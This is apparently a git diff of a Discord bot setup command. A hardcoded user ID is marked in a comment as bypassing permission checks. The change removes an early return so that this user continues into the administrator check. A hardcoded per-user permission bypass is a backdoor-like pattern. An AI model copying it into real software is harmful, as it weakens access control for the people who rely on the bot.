@@ -11,7 +11,7 @@ module.exports = {
     if (interaction.user.id === '899973198467170335') {
       // Bypass permission checks for this user
       await interaction.reply({ content: 'Welcome! You have access to run setup.', flags: 64 });
-      return;
+      // Continue with the setup process
     }
 
     if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
